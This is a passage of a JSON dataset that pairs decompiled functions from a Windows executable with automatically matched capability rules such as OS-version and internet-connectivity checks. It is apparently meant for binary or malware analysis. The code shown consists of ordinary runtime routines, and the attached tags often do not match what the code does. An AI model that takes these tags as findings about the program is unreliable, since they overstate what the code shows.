        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00462c9b(uint arg_8h, uint32_t arg_ch, uint32_t arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    int32_t var_10h;\n    int32_t *var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    fcn.00461b27(arg_8h);\n    if (((*(var_8h + 0x19 + (arg_ch & 0xff)) & arg_14h) == 0) &&\n       ((arg_10h == 0 || ((arg_10h & *(*var_ch + (arg_ch & 0xff) * 2)) == 0)))) {\n        uVar1 = 0;\n    }\n    else {\n        uVar1 = 1;\n    }\n    if (var_4h != '\\0') {\n        *(var_10h + 0x350) = *(var_10h + 0x350) & 0xfffffffd;\n    }\n    return uVar1;\n}\n",
        "token_count": 246
    },
    "0047a22b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint16_t * __cdecl fcn.0047a22b(uint16_t *arg_8h, uint arg_ch)\n\n{\n    uchar auVar1 [16];\n    uchar auVar2 [16];\n    uint16_t uVar3;\n    uint16_t uVar4;\n    int32_t iVar5;\n    \n    if (0 < *0x6ccba8) {\n        auVar1 = pshuflw(ZEXT216(arg_ch), ZEXT216(arg_ch), 0);\n        do {\n            if ((arg_8h & 0xfff) < 0xff1) {\n                uVar3 = SUB162(auVar1, 0);\n                uVar4 = SUB162(auVar1 >> 0x10, 0);\n                auVar2 = CONCAT214(-(*0x47d04e == arg_8h[7]), \n                                   CONCAT212(-(*0x47d04c == arg_8h[6]), \n                                             CONCAT210(-(*0x47d04a == arg_8h[5]), \n                                                       CONCAT28(-(*0x47d048 == arg_8h[4]), \n                                                                CONCAT26(-(*0x47d046 == arg_8h[3]), \n                                                                         CONCAT24(-(*0x47d044 == arg_8h[2]), \n                                                                                  CONCAT22(-(*0x47d042 == arg_8h[1]), \n                                                                                           -(*0x47d040 == *arg_8h)))))))\n                                  ) |\n                         CONCAT214(-(arg_8h[7] == uVar4), \n                                   CONCAT212(-(arg_8h[6] == uVar3), \n                                             CONCAT210(-(arg_8h[5] == uVar4), \n                                                       CONCAT28(-(arg_8h[4] == uVar3), \n                                                                CONCAT26(-(arg_8h[3] == uVar4), \n                                                                         CONCAT24(-(arg_8h[2] == uVar3), \n                                                                                  CONCAT22(-(arg_8h[1] == uVar4), \n                                                                                           -(*arg_8h == uVar3))))))));\n                uVar3 = SUB161(auVar2 >> 7, 0) & 1 | (SUB161(auVar2 >> 0xf, 0) & 1) << 1 |\n                        (SUB161(auVar2 >> 0x17, 0) & 1) << 2 | (SUB161(auVar2 >> 0x1f, 0) & 1) << 3 |\n                        (SUB161(auVar2 >> 0x27, 0) & 1) << 4 | (SUB161(auVar2 >> 0x2f, 0) & 1) << 5 |\n                        (SUB161(auVar2 >> 0x37, 0) & 1) << 6 | (SUB161(auVar2 >> 0x3f, 0) & 1) << 7 |\n                        (SUB161(auVar2 >> 0x47, 0) & 1) << 8 | (SUB161(auVar2 >> 0x4f, 0) & 1) << 9 |\n                        (SUB161(auVar2 >> 0x57, 0) & 1) << 10 | (SUB161(auVar2 >> 0x5f, 0) & 1) << 0xb |\n                        (SUB161(auVar2 >> 0x67, 0) & 1) << 0xc | (SUB161(auVar2 >> 0x6f, 0) & 1) << 0xd |\n                        (SUB161(auVar2 >> 0x77, 0) & 1) << 0xe | SUB161(auVar2 >> 0x7f, 0) << 0xf;\n                if (uVar3 != 0) goto code_r0x0047a2c7;\n                iVar5 = 0x10;\n            }\n            else {\n                if (*arg_8h == arg_ch) {\n                    return arg_8h;\n                }\n                if (*arg_8h == 0) {\n                    return NULL;\n                }\n                iVar5 = 2;\n            }\n            arg_8h = arg_8h + iVar5;\n        } while( true );\n    }\n    uVar3 = *arg_8h;\n    while ((uVar3 != 0 && (uVar3 != arg_ch))) {\n        arg_8h = arg_8h + 1;\n        uVar3 = *arg_8h;\n    }\ncode_r0x0047a266:\n    return (uVar3 != arg_ch) - 1 & arg_8h;\ncode_r0x0047a2c7:\n    iVar5 = 0;\n    if (uVar3 != 0) {\n        for (; (uVar3 >> iVar5 & 1) == 0; iVar5 = iVar5 + 1) {\n        }\n    }\n    arg_8h = arg_8h + iVar5;\n    uVar3 = *arg_8h;\n    goto code_r0x0047a266;\n}\n",
        "token_count": 1142
    },
    "0046403b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl fcn.0046403b(uint arg_8h)\n\n{\n    code *pcVar1;\n    bool bVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t unaff_EBP;\n    int32_t *piVar8;\n    uint *in_FS_OFFSET;\n    bool bVar9;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_19h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00430e10(0x486d20, 0x28);\n    piVar8 = NULL;\n    *(unaff_EBP + -0x28) = 0;\n    *(unaff_EBP + -0x34) = 0;\n    bVar2 = true;\n    *(unaff_EBP + -0x19) = 1;\n    iVar6 = *(unaff_EBP + 8);\n    if (0xb < iVar6) {\n        if (((iVar6 == 0xf) || (iVar6 == 0x15)) || (iVar6 == 0x16)) goto code_r0x004640c4;\ncode_r0x00464097:\n        puVar5 = fcn.0043bcb5();\n        *puVar5 = 0x16;\n        fcn.0043bb3e();\ncode_r0x00464081:\n        uVar3 = 0xffffffff;\n        goto code_r0x00464209;\n    }\n    if (iVar6 == 0xb) {\ncode_r0x00464073:\n        piVar8 = fcn.0045cfb4();\n        *(unaff_EBP + -0x28) = piVar8;\n        if (piVar8 == NULL) goto code_r0x00464081;\n        iVar4 = fcn.00463f87(iVar6, *piVar8);\n        if (iVar4 == 0) goto code_r0x00464097;\n        iVar4 = iVar4 + 8;\n        bVar2 = false;\n        *(unaff_EBP + -0x19) = 0;\n    }\n    else {\n        if (iVar6 != 2) {\n            if (iVar6 != 4) {\n                if (iVar6 == 6) goto code_r0x004640c4;\n                if (iVar6 != 8) goto code_r0x00464097;\n            }\n            goto code_r0x00464073;\n        }\ncode_r0x004640c4:\n        iVar4 = fcn.00463ef5(iVar6);\n    }\n    *(unaff_EBP + -0x24) = iVar4;\n    *(unaff_EBP + -0x30) = 0;\n    if (bVar2) {\n        fcn.00460b9b(3);\n    }\n    *(unaff_EBP + -0x2c) = 0;\n    *(unaff_EBP + -0x1a) = 0;\n    *(unaff_EBP + -4) = 0;\n    iVar4 = **(unaff_EBP + -0x24);\n    *(unaff_EBP + -0x20) = iVar4;\n    if (bVar2) {\n        iVar4 = fcn.00463dc0(iVar4);\n        *(unaff_EBP + -0x20) = iVar4;\n    }\n    *(unaff_EBP + -0x2c) = iVar4;\n    bVar9 = iVar4 == 1;\n    *(unaff_EBP + -0x1a) = bVar9;\n    if (!bVar9) {\n        if (iVar4 == 0) {\n            if (bVar2) {\n                fcn.00460be3(3);\n            }\n            fcn.00456d19(3);\n            pcVar1 = swi(3);\n            uVar3 = (*pcVar1)();\n            return uVar3;\n        }\n        if (((iVar6 == 8) || (iVar6 == 0xb)) || (iVar6 == 4)) {\n            *(unaff_EBP + -0x30) = piVar8[1];\n            piVar8[1] = 0;\n            if (iVar6 == 8) {\n                iVar4 = fcn.0045ce63();\n                *(unaff_EBP + -0x34) = *(iVar4 + 8);\n                iVar4 = fcn.0045ce63();\n                *(iVar4 + 8) = 0x8c;\n                goto code_r0x00464154;\n            }\n        }\n        else {\ncode_r0x00464154:\n            if (iVar6 == 8) {\n                iVar4 = *0x47e548 * 0xc + *piVar8;\n                iVar7 = *0x47e54c * 0xc + iVar4;\n                for (; *(unaff_EBP + -0x38) = iVar4,  iVar4 != iVar7; iVar4 = iVar4 + 0xc) {\n                    *(iVar4 + 8) = 0;\n                }\n                goto code_r0x00464185;\n            }\n        }\n        **(unaff_EBP + -0x24) = *0x6cade0;\n    }\ncode_r0x00464185:\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.004641c5();\n    if (!bVar9) {\n        if (iVar6 == 8) {\n            iVar4 = fcn.0045ce63();\n            pcVar1 = *(unaff_EBP + -0x20);\n            (**0x47b3f8)(8, *(iVar4 + 8));\n            (*pcVar1)();\n        }\n        else {\n            (**0x47b3f8)(iVar6);\n            (**(unaff_EBP + -0x20))();\n            if ((iVar6 != 0xb) && (iVar6 != 4)) goto code_r0x00464207;\n        }\n        piVar8[1] = *(unaff_EBP + -0x30);\n        if (iVar6 == 8) {\n            iVar6 = fcn.0045ce63();\n            *(iVar6 + 8) = *(unaff_EBP + -0x34);\n        }\n    }\ncode_r0x00464207:\n    uVar3 = 0;\ncode_r0x00464209:\n    *in_FS_OFFSET = *(unaff_EBP + -0x10);\n    return uVar3;\n}\n",
        "token_count": 1505
    },
    "004648ca": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004648ca(uint32_t arg_8h)\n\n{\n    if ((arg_8h & 3) == 2) {\n        return arg_8h & 0xffffff00 | (arg_8h & 0xc0) != 0;\n    }\n    return arg_8h & 0xffffff00;\n}\n",
        "token_count": 79
    },
    "00464a79": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00464a79(int16_t *arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int16_t iVar1;\n    uint *puVar2;\n    int16_t *piVar3;\n    uint uStack16;\n    \n    if ((arg_8h != NULL) && (arg_ch != 0)) {\n        piVar3 = arg_8h;\n        if (arg_10h != 0) {\n            do {\n                if (*piVar3 == 0) {\n                    arg_10h = arg_10h - piVar3;\n                    do {\n                        iVar1 = *(arg_10h + piVar3);\n                        *piVar3 = iVar1;\n                        piVar3 = piVar3 + 1;\n                        if (iVar1 == 0) {\n                            return 0;\n                        }\n                        arg_ch = arg_ch + -1;\n                    } while (arg_ch != 0);\n                    *arg_8h = 0;\n                    puVar2 = fcn.0043bcb5();\n                    uStack16 = 0x22;\n                    goto code_r0x00464aa1;\n                }\n                arg_ch = arg_ch + -1;\n                piVar3 = piVar3 + 1;\n            } while (arg_ch != 0);\n        }\n        *arg_8h = 0;\n    }\n    puVar2 = fcn.0043bcb5();\n    uStack16 = 0x16;\ncode_r0x00464aa1:\n    *puVar2 = uStack16;\n    fcn.0043bb3e();\n    return uStack16;\n}\n",
        "token_count": 363
    },
    "00464d01": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00464d01(int32_t arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint arg_8h_00;\n    \n    iVar2 = (*_sym.imp.KERNEL32.dll_IsDebuggerPresent)();\n    if (iVar2 != 0) {\n        if (arg_8h != 0) {\n            (*_sym.imp.KERNEL32.dll_OutputDebugStringW)(arg_8h);\n        }\n        iVar3 = fcn.00460e6e();\n        if (iVar3 != 1) {\n            return 4;\n        }\n    }\n    iVar3 = fcn.00460e09();\n    if ((iVar3 == 2) && (cVar1 = fcn.00460994(),  cVar1 != '\\0')) {\n        cVar1 = fcn.00460a84();\n        if (cVar1 == '\\0') {\n            arg_10h = arg_10h | 0x200000;\n            arg_8h_00 = 0;\n        }\n        else {\n            arg_8h_00 = fcn.00460a08();\n        }\n        iVar2 = fcn.0046087e(arg_8h_00, arg_8h, arg_ch, arg_10h);\n        return iVar2;\n    }\n    return (iVar2 != 0) + 3;\n}\n",
        "token_count": 325
    },
    "00464eda": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00464eda(uint32_t arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint var_4h;\n    \n    if ((-1 < arg_8h) && (arg_8h < *0x6cd830)) {\n        iVar3 = (arg_8h & 0x3f) * 0x38;\n        if (*(iVar3 + 0x18 + *((arg_8h >> 6) * 4 + 0x6cd630)) == -1) {\n            iVar1 = fcn.00458730();\n            if (iVar1 == 1) {\n                if (arg_8h == 0) {\n                    uVar4 = 0xfffffff6;\n                }\n                else if (arg_8h == 1) {\n                    uVar4 = 0xfffffff5;\n                }\n                else {\n                    if (arg_8h != 2) goto code_r0x00464f3f;\n                    uVar4 = 0xfffffff4;\n                }\n                (*_sym.imp.KERNEL32.dll_SetStdHandle)(uVar4, arg_ch);\n            }\ncode_r0x00464f3f:\n            *(*((arg_8h >> 6) * 4 + 0x6cd630) + 0x18 + iVar3) = arg_ch;\n            return 0;\n        }\n    }\n    puVar2 = fcn.0043bcb5();\n    *puVar2 = 9;\n    puVar2 = fcn.0043bca2();\n    *puVar2 = 0;\n    return 0xffffffff;\n}\n",
        "token_count": 381
    },
    "00465433": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_58h\n\nvoid __cdecl fcn.00465433(uint *arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t *piVar2;\n    char cVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint *puVar6;\n    uchar *puVar7;\n    uint *puVar8;\n    int32_t iVar9;\n    ushort *puVar10;\n    uint *puVar11;\n    uint *puVar12;\n    uint *var_58h;\n    uint var_54h;\n    uint *var_50h;\n    uint *var_4ch;\n    ushort *var_48h;\n    uint *var_44h;\n    int32_t var_40h;\n    ushort *var_3ch;\n    uint32_t var_38h;\n    uint *var_34h;\n    uint *var_30h;\n    uchar *var_2ch;\n    uint *var_28h;\n    int32_t var_24h;\n    uint *var_20h;\n    uint *var_1ch;\n    uint32_t var_18h;\n    uint var_12h;\n    uint32_t var_4h;\n    \n    var_4h = *0x6cade0 ^ &stack0xfffffffc;\n    var_34h = arg_8h;\n    puVar8 = NULL;\n    var_1ch = NULL;\n    var_20h = NULL;\n    var_24h = 0;\n    var_58h = arg_8h;\n    var_54h = 0;\n    if (arg_8h[0x2a] == 0) {\n        piVar2 = arg_8h[0x23];\n        if (piVar2 != NULL) {\n            LOCK();\n            *piVar2 = *piVar2 + -1;\n        }\n        arg_8h[0x23] = 0;\n        arg_8h[0x24] = 0;\n        *arg_8h = 0x47f780;\n        arg_8h[0x25] = 0x47fa00;\n        arg_8h[0x26] = 0x47fb80;\n        arg_8h[1] = 1;\n        goto code_r0x00465881;\n    }\n    var_30h = NULL;\n    if ((arg_8h[2] == 0) && (iVar4 = fcn.0046f589(&var_58h, 0, arg_8h[0x2a], 0x1004, arg_8h + 2),  iVar4 != 0)) {\ncode_r0x00465814:\n        fcn.0045d185(var_30h);\n        fcn.0045d185(var_1ch);\n        fcn.0045d185(var_20h);\n        fcn.0045d185(puVar8);\n    }\n    else {\n        var_30h = fcn.00460ec9(1, 4);\n        fcn.0045d185(0);\n        var_1ch = fcn.00460ec9(0x180, 2);\n        fcn.0045d185(0);\n        var_20h = fcn.00460ec9(0x180, 1);\n        fcn.0045d185(0);\n        puVar8 = fcn.00460ec9(0x180, 1);\n        var_28h = puVar8;\n        fcn.0045d185(0);\n        var_24h = fcn.00460ec9(0x101, 1);\n        fcn.0045d185(0);\n        if ((var_30h == NULL) || ((((var_1ch == NULL || (var_24h == 0)) || (var_20h == NULL)) || (puVar8 == NULL))))\n        goto code_r0x00465814;\n        iVar4 = 0;\n        do {\n            *(iVar4 + var_24h) = iVar4;\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < 0x100);\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetCPInfo)(arg_8h[2], &var_18h);\n        if ((iVar4 == 0) || (5 < var_18h)) goto code_r0x00465814;\n        var_38h = var_18h & 0xffff;\n        if (1 < var_38h) {\n            if (arg_8h[2] == 0xfde9) {\n                fcn.00431db0(var_24h + 0x80, 0x20, 0x80);\n            }\n            else {\n                puVar6 = &var_12h;\n                uVar1 = var_12h;\n                while ((uVar1 != 0 && (arg_8h = var_34h,  *(puVar6 + 1) != 0))) {\n                    uVar5 = *puVar6;\n                    if (uVar5 <= *(puVar6 + 1)) {\n                        do {\n                            *(uVar5 + var_24h) = 0x20;\n                            uVar5 = uVar5 + 1;\n                        } while (uVar5 <= *(puVar6 + 1));\n                    }\n                    puVar6 = puVar6 + 2;\n                    uVar1 = *puVar6;\n                }\n            }\n        }\n        var_2ch = var_24h + 1;\n        iVar4 = fcn.0046e3ea(0, arg_8h[0x2a], 0x100, var_2ch, 0xff, var_20h + 0x81, 0xff, arg_8h[2], 0);\n        if ((iVar4 == 0) ||\n           (iVar4 = fcn.0046e3ea(0, arg_8h[0x2a], 0x200, var_2ch, 0xff, puVar8 + 0x81, 0xff, arg_8h[2], 0),  iVar4 == 0)\n           ) goto code_r0x00465814;\n        var_44h = var_1ch + 0x40;\n        iVar4 = fcn.00466783(0, 1, var_24h, 0x100, var_44h, arg_8h[2], 0);\n        puVar12 = var_28h;\n        puVar6 = var_34h;\n        if (iVar4 == 0) goto code_r0x00465814;\n        var_48h = var_1ch + 0xfe;\n        *var_48h = 0;\n        var_4ch = var_20h + 0x20;\n        *(var_20h + 0x7f) = 0;\n        *(var_28h + 0x7f) = 0;\n        *var_4ch = 0;\n        var_50h = var_28h + 0x20;\n        *var_50h = 0;\n        if (1 < var_38h) {\n            if (arg_8h[2] == 0xfde9) {\n                puVar8 = var_28h + 0x40;\n                iVar9 = var_20h - var_28h;\n                iVar4 = -0x142 - var_28h;\n                var_2ch = -0x80 - var_28h;\n                var_28h = var_1ch + 0x80;\n                do {\n                    puVar11 = var_28h + 2;\n                    *var_28h = (-(0x32 < iVar4 + puVar8) & 0x8000) + 0x8000;\n                    cVar3 = puVar8 + var_2ch;\n                    *(iVar9 + puVar8) = cVar3;\n                    *puVar8 = cVar3;\n                    puVar8 = puVar8 + 1;\n                    var_28h = puVar11;\n                } while (var_2ch + puVar8 < 0x100);\n            }\n            else {\n                puVar8 = &var_12h;\n                while ((var_12h != 0 && (*(puVar8 + 1) != 0))) {\n                    uVar5 = *puVar8;\n                    if (uVar5 <= *(puVar8 + 1)) {\n                        var_2ch = var_28h + uVar5 + 0x80;\n                        var_40h = var_20h - var_28h;\n                        var_3ch = var_1ch + uVar5 * 2 + 0x100;\n                        puVar7 = var_2ch;\n                        puVar10 = var_3ch;\n                        do {\n                            *puVar10 = 0x8000;\n                            puVar10 = puVar10 + 1;\n                            puVar7[var_40h] = uVar5;\n                            *puVar7 = uVar5;\n                            uVar5 = uVar5 + 1;\n                            puVar7 = puVar7 + 1;\n                        } while (uVar5 <= *(puVar8 + 1));\n                    }\n                    puVar8 = puVar8 + 2;\n                    var_12h._0_1_ = *puVar8;\n                }\n            }\n        }\n        puVar8 = var_1ch + 0x80;\n        puVar11 = var_1ch;\n        for (iVar4 = 0x3f; iVar4 != 0; iVar4 = iVar4 + -1) {\n            *puVar11 = *puVar8;\n            puVar8 = puVar8 + 1;\n            puVar11 = puVar11 + 1;\n        }\n        *puVar11 = *puVar8;\n        puVar8 = var_20h + 0x40;\n        puVar11 = var_20h;\n        for (iVar4 = 0x1f; iVar4 != 0; iVar4 = iVar4 + -1) {\n            *puVar11 = *puVar8;\n            puVar8 = puVar8 + 1;\n            puVar11 = puVar11 + 1;\n        }\n        *puVar11 = *puVar8;\n        *(puVar11 + 2) = *(puVar8 + 2);\n        puVar8 = puVar12 + 0x40;\n        for (iVar4 = 0x1f; iVar4 != 0; iVar4 = iVar4 + -1) {\n            *puVar12 = *puVar8;\n            puVar8 = puVar8 + 1;\n            puVar12 = puVar12 + 1;\n        }\n        *puVar12 = *puVar8;\n        *(puVar12 + 2) = *(puVar8 + 2);\n        piVar2 = var_34h[0x23];\n        if (piVar2 != NULL) {\n            LOCK();\n            iVar4 = *piVar2;\n            *piVar2 = iVar4 + -1;\n            if (iVar4 + -1 == 0) {\n                fcn.0045d185(var_34h[0x24] + -0xfe);\n                fcn.0045d185(puVar6[0x25] + -0x80);\n                fcn.0045d185(puVar6[0x26] + -0x80);\n                fcn.0045d185(puVar6[0x23]);\n            }\n        }\n        *var_30h = 1;\n        puVar6[0x23] = var_30h;\n        *puVar6 = var_44h;\n        puVar6[0x24] = var_48h;\n        puVar6[0x25] = var_4ch;\n        puVar6[0x26] = var_50h;\n        puVar6[1] = var_38h;\n    }\n    fcn.0045d185(var_24h);\ncode_r0x00465881:\n    fcn.004303e9(var_58h);\n    return;\n}\n",
        "token_count": 2713
    },
    "004659da": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004659da(int32_t arg_8h)\n\n{\n    uint8_t *puVar1;\n    uint8_t uVar2;\n    int32_t *piVar3;\n    uint *puVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    uint32_t uVar12;\n    uint32_t uVar13;\n    uint32_t uVar14;\n    uint32_t uVar15;\n    uint32_t uVar16;\n    uint32_t uVar17;\n    uint32_t uVar18;\n    uint32_t uVar19;\n    uint32_t uVar20;\n    uint32_t uVar21;\n    uint32_t uVar22;\n    uint32_t uVar23;\n    uint32_t uVar24;\n    uint32_t uVar25;\n    uint uVar26;\n    int32_t iVar27;\n    uint8_t *puVar28;\n    uint *arg_8h_00;\n    uint8_t *puVar29;\n    uint *puVar30;\n    int32_t var_10h;\n    uint var_ch;\n    uint *var_8h;\n    uint *var_4h;\n    \n    var_10h = arg_8h;\n    var_4h = NULL;\n    var_ch = 0;\n    if ((*(arg_8h + 0xac) == 0) && (*(arg_8h + 0xb0) == 0)) {\n        var_4h = NULL;\n        arg_8h_00 = 0x6cb518;\n        var_8h = NULL;\ncode_r0x00465cf5:\n        piVar3 = *(arg_8h + 0x84);\n        if (piVar3 != NULL) {\n            LOCK();\n            *piVar3 = *piVar3 + -1;\n        }\n        piVar3 = *(arg_8h + 0x7c);\n        if (piVar3 != NULL) {\n            LOCK();\n            iVar27 = *piVar3;\n            *piVar3 = iVar27 + -1;\n            if (iVar27 + -1 == 0) {\n                fcn.0045d185(*(arg_8h + 0x88));\n                fcn.0045d185(*(arg_8h + 0x7c));\n            }\n        }\n        *(arg_8h + 0x84) = var_4h;\n        *(arg_8h + 0x7c) = var_8h;\n        uVar26 = 0;\n        *(arg_8h + 0x88) = arg_8h_00;\n    }\n    else {\n        arg_8h_00 = fcn.00460ec9(1, 0x50);\n        fcn.0045d185(0);\n        if (arg_8h_00 != NULL) {\n            puVar4 = fcn.00460ec9(1, 4);\n            var_8h = puVar4;\n            fcn.0045d185(0);\n            if (puVar4 == NULL) {\n                fcn.0045d185(arg_8h_00);\n            }\n            else {\n                if (*(arg_8h + 0xac) == 0) {\n                    puVar4 = 0x6cb518;\n                    puVar30 = arg_8h_00;\n                    for (iVar27 = 0x14; iVar27 != 0; iVar27 = iVar27 + -1) {\n                        *puVar30 = *puVar4;\n                        puVar4 = puVar4 + 1;\n                        puVar30 = puVar30 + 1;\n                    }\ncode_r0x00465cb5:\n                    piVar3 = arg_8h + 0x88;\n                    *arg_8h_00 = **piVar3;\n                    arg_8h_00[1] = *(*piVar3 + 4);\n                    arg_8h_00[2] = *(*piVar3 + 8);\n                    arg_8h_00[0xc] = *(*piVar3 + 0x30);\n                    arg_8h_00[0xd] = *(*piVar3 + 0x34);\n                    *var_8h = 1;\n                    if (var_4h != NULL) {\n                        *var_4h = 1;\n                    }\n                    goto code_r0x00465cf5;\n                }\n                puVar4 = fcn.00460ec9(1, 4);\n                var_4h = puVar4;\n                fcn.0045d185(0);\n                if (puVar4 == NULL) {\n                    fcn.0045d185(arg_8h_00);\n                    fcn.0045d185(var_8h);\n                }\n                else {\n                    uVar26 = *(arg_8h + 0xac);\n                    uVar5 = fcn.0046f589(&var_10h, 1, uVar26, 0x15, arg_8h_00 + 3);\n                    uVar6 = fcn.0046f589(&var_10h, 1, uVar26, 0x14, arg_8h_00 + 4);\n                    uVar7 = fcn.0046f589(&var_10h, 1, uVar26, 0x16, arg_8h_00 + 5);\n                    uVar8 = fcn.0046f589(&var_10h, 1, uVar26, 0x17, arg_8h_00 + 6);\n                    uVar9 = fcn.0046f589(&var_10h, 1, uVar26, 0x18, arg_8h_00 + 7);\n                    uVar10 = fcn.0046f589(&var_10h, 1, uVar26, 0x50, arg_8h_00 + 8);\n                    uVar11 = fcn.0046f589(&var_10h, 1, uVar26, 0x51, arg_8h_00 + 9);\n                    uVar12 = fcn.0046f589(&var_10h, 0, uVar26, 0x1a, arg_8h_00 + 10);\n                    uVar13 = fcn.0046f589(&var_10h, 0, uVar26, 0x19, arg_8h_00 + 0x29);\n                    uVar14 = fcn.0046f589(&var_10h, 0, uVar26, 0x54, arg_8h_00 + 0x2a);\n                    uVar15 = fcn.0046f589(&var_10h, 0, uVar26, 0x55, arg_8h_00 + 0x2b);\n                    uVar16 = fcn.0046f589(&var_10h, 0, uVar26, 0x56, arg_8h_00 + 0xb);\n                    uVar17 = fcn.0046f589(&var_10h, 0, uVar26, 0x57, arg_8h_00 + 0x2d);\n                    uVar18 = fcn.0046f589(&var_10h, 0, uVar26, 0x52, arg_8h_00 + 0x2e);\n                    uVar19 = fcn.0046f589(&var_10h, 0, uVar26, 0x53, arg_8h_00 + 0x2f);\n                    uVar20 = fcn.0046f589(&var_10h, 2, uVar26, 0x15, arg_8h_00 + 0xe);\n                    uVar21 = fcn.0046f589(&var_10h, 2, uVar26, 0x14, arg_8h_00 + 0xf);\n                    uVar22 = fcn.0046f589(&var_10h, 2, uVar26, 0x16, arg_8h_00 + 0x10);\n                    uVar23 = fcn.0046f589(&var_10h, 2, uVar26, 0x17, arg_8h_00 + 0x11);\n                    uVar24 = fcn.0046f589(&var_10h, 2, uVar26, 0x50, arg_8h_00 + 0x12);\n                    uVar25 = fcn.0046f589(&var_10h, 2, uVar26, 0x51, arg_8h_00 + 0x13);\n                    if ((uVar25 | uVar5 | uVar6 | uVar7 | uVar8 | uVar9 | uVar10 | uVar11 | uVar12 | uVar13 | uVar14 |\n                                  uVar15 | uVar16 | uVar17 | uVar18 | uVar19 | uVar20 | uVar21 | uVar22 | uVar23 |\n                                  uVar24) == 0) {\n                        puVar28 = arg_8h_00[7];\n                        while (uVar2 = *puVar28,  uVar2 != 0) {\n                            if (uVar2 - 0x30 < 10) {\n                                *puVar28 = uVar2 - 0x30;\ncode_r0x00465c8c:\n                                puVar28 = puVar28 + 1;\n                            }\n                            else {\n                                puVar29 = puVar28;\n                                if (uVar2 != 0x3b) goto code_r0x00465c8c;\n                                do {\n                                    puVar1 = puVar29 + 1;\n                                    *puVar29 = *puVar1;\n                                    puVar29 = puVar29 + 1;\n                                } while (*puVar1 != 0);\n                            }\n                        }\n                        goto code_r0x00465cb5;\n                    }\n                    fcn.004658dc(arg_8h_00);\n                    fcn.0045d185(arg_8h_00);\n                    fcn.0045d185(var_8h);\n                    fcn.0045d185(var_4h);\n                }\n            }\n        }\n        uVar26 = 1;\n    }\n    return uVar26;\n}\n",
        "token_count": 2338
    },
    "0046610a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0046610a(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    \n    if (*(arg_8h + 0xb4) == 0) {\n        iVar2 = 0x47e838;\n    }\n    else {\n        iVar2 = fcn.00460ec9(1, 0x164);\n        if (iVar2 == 0) {\n            fcn.0045d185(0);\n        }\n        else {\n            cVar1 = fcn.00466176(iVar2, arg_8h);\n            if (cVar1 != '\\0') {\n                *(iVar2 + 0xb0) = 1;\n                fcn.0045d185(0);\n                return iVar2;\n            }\n            fcn.0046640b(iVar2);\n            fcn.0045d185(iVar2);\n        }\n        iVar2 = 0;\n    }\n    return iVar2;\n}\n",
        "token_count": 219
